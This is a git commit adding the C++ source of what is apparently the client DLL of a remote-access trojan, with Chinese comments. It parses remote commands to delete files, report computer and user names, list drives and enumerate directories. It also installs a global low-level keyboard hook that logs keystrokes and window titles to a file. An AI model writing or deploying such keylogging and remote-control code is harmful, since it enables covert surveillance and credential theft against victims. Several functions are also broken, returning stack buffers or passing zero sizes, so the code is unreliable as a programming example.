ba85a46e927ccc653413203b8645d1b74e870967
oldnumber18 <117345554+oldnumber18@users.noreply.github.com>
2024-09-20 21:21:25 +0800

    Add files via upload

---
+++ DLL/Client/D_API/pch.cpp
@@ -0,0 +1,163 @@
+﻿// pch.cpp: 与预编译标头对应的源文件
+#include "pch.h"
+
+// 当使用预编译的头时，需要使用此源文件，编译才能成功。
+//如果这样转递char难受的话请看: https://blog.csdn.net/qq_39759656/article/details/81138008
+// System Information
+char* LookUpSystemInfo() {
+	char SystemInfo[255] = { 0 };
+	char SystemName[255] = { 0 };
+	char UserName[255] = { 0 };
+	unsigned long size = 0;
+	GetComputerName(SystemName, &size);
+	GetUserName(UserName, &size);
+	sprintf(SystemInfo, "Compute Name:\"%s\" , Now UserName:\"%s\"", SystemName, UserName);
+	return SystemInfo;
+}
+char* LookUpPan() {
+	char Pan[MAX_PATH] = { 0 };
+	char Info[MAX_PATH] = { 0 };
+	DWORD Result = GetLogicalDriveStringsA(MAX_PATH, Info);
+	if (Result > 0 && Result <= MAX_PATH) {
+		char* Drive = Info;
+		while (*Drive) {
+			strcat(Pan, Drive);
+			Drive += strlen(Drive) + 1;
+		}
+	}
+	return Pan;
+}
+char* LookUpRunPath() {
+	char RunPath[MAX_PATH] = { 0 };
+	getcwd(RunPath, strlen(RunPath));
+	return RunPath;
+}
+// Cmd
+BOOL RunCommad(char* commad,vector<char*>* SendInfoArray) {
+
+}
+// FILE //传输方式有点特殊,因为需要多段传送
+void LookUpFile(char* FilePath, vector<char*>* SendInfoArray) {
+	//值得注意的地方就是，FilePath如果不够大可能会溢出。即:把写入大小交给使用者
+	char Path[MAX_PATH] = { 0 };
+	strcpy(Path, FilePath);// save file path.
+	char File[MAX_PATH] = { 0 };
+	strcpy(File, FilePath);
+	strcat(File, "\\*.*");// add to last.
+	HANDLE file;
+	WIN32_FIND_DATA pNextInfo;
+	file = FindFirstFile(File, &pNextInfo);
+	if (file == INVALID_HANDLE_VALUE) {
+		SendInfoArray->push_back((char*)malloc(sizeof(char) * DATA_BUFMID));
+		sprintf(SendInfoArray->back(), "该目录下没有文件。");
+		return;
+	}
+	for (int i = 1; FindNextFile(file, &pNextInfo); i++) {
+		if (pNextInfo.cFileName[0] == '.') {
+			i--;
+			continue;
+		}
+		SYSTEMTIME  AccessTime, CreationTime;
+		FileTimeToSystemTime(&pNextInfo.ftLastAccessTime, &AccessTime);//  最后一次访问
+		FileTimeToSystemTime(&pNextInfo.ftCreationTime, &CreationTime);// 创建时间
+		SendInfoArray->push_back((char*)malloc(sizeof(char) * DATA_BUFMID));
+		sprintf(SendInfoArray->back(), "No.%d Path:%s\\%s\t创建时间:%d年%d月%d日\t最后一次访问时间:%d年%d月%d日\n", i, Path, pNextInfo.cFileName, CreationTime.wYear, CreationTime.wMonth, CreationTime.wDay, AccessTime.wYear, AccessTime.wMonth, AccessTime.wDay);
+	}
+	return;
+}
+/*
+bool LookUpFile(char* Path) {
+	FILE* fp = nullptr;
+	fp = fopen(Path, "r");
+	if (fp != nullptr) {
+		fclose(fp);
+		return true;
+	}
+	return false;
+}
+*/
+BOOL RemoveFile(char* Path) {
+	if (remove(Path)) return FALSE;
+	return TRUE;
+}
+// HOOK hHookKeyBorad
+HHOOK hHookKeyBorad = NULL;
+extern HMODULE hModule;
+LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+	FILE* fp = fopen("KeyBoardLog.txt", "a");
+	if (nCode == HC_ACTION) {
+		char wszTitle[MAX_PATH] = { 0 };
+		HWND hWindow = GetForegroundWindow();
+		GetWindowTextA(hWindow, wszTitle, MAX_PATH);
+		KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
+		if (wParam == WM_KEYDOWN) {
+			SYSTEMTIME time;
+			GetLocalTime(&time);
+			fprintf(fp, "%02d-%02d:%02d %d %s\n", time.wDay, time.wHour, time.wMonth, p->vkCode, wszTitle);
+		}
+	}
+	fclose(fp);
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+BOOL LoadKeyBoardHOOK() {
+	hHookKeyBorad = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProc, hModule, 0);
+	if (hHookKeyBorad == NULL) return FALSE;
+	return TRUE;
+}
+BOOL UnLoadHOOK() {
+	if (hHookKeyBorad) UnhookWindowsHookEx(hHookKeyBorad);
+	return TRUE;
+}
+// 指令处理中心
+vector<char*> ReturnInfoArray;
+void SetSendInfo(const char* SendInfo) {
+	ReturnInfoArray.push_back((char*)malloc(sizeof(char) * DATA_BUFMID));
+	strcpy(ReturnInfoArray.back(), SendInfo);
+}
+vector<char*>* ParseCommand(char* Type,// 指令分类(指令类型)
+						char* Command,// 具体指令
+						char* Info) {// 指令参数
+	if (!strcmp(Type, "F")) {
+		if (!strcmp(Command, "delfile")) {
+			if (RemoveFile(Info)) SetSendInfo("删除文件成功。");
+			else SetSendInfo("删除文件失败。");
+		}
+	}
+	else if (!strcmp(Type, "L")) {
+		if (!strcmp(Info, "systeminfo")) {
+			SetSendInfo(LookUpSystemInfo());
+		}
+		else if (!strcmp(Info, "pan")) {
+			SetSendInfo(LookUpPan());
+		}
+		else if (!strcmp(Info, "runpath")) {
+			SetSendInfo(LookUpRunPath());
+		}
+		else if (!strcmp(Command, "lookfile")) {
+			LookUpFile(Info, &ReturnInfoArray);
+		}
+		else {
+			SetSendInfo("查找不到对应具体指令。");
+		}
+	}
+	else if (!strcmp(Type, "S")) {
+
+	}
+	else if (!strcmp(Type, "C")) {
+		 
+	}
+	else {
+		SetSendInfo("查找不到对应指令类型。");
+	}
+	return &ReturnInfoArray;
+}
+BOOL FreeVectorArray() {
+	for (int i = 0; i < ReturnInfoArray.size(); i++) {
+		free(ReturnInfoArray.at(i));
+	}
+	ReturnInfoArray.clear();
+}
+/*
+说明
+1.当一个模块提供一个用于分配内存块的函数时，该模块也必须提供释放内存的函数。（谁申请内存 谁就去释放内存）、
+*/
